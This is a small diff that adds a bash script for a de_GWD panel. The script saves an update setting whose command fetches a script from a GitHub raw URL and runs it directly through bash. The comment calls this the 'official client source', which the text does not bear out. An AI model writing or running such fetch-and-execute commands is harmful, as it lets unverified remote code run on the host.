@@ -1,0 +1,6 @@
+#!/bin/bash
+set -euo pipefail
+# Compatibility CLI entry; download only the fixed official client source.
+exec /opt/de_GWD/ui-panel <<'JSON'
+{"action":"updateSave","params":{"updateAddr":"127.0.0.1","updatePort":"3000","updateCMD":"bash <(curl -fsSL https://raw.githubusercontent.com/XDcooler/mygwd/main/client)"}}
+JSON
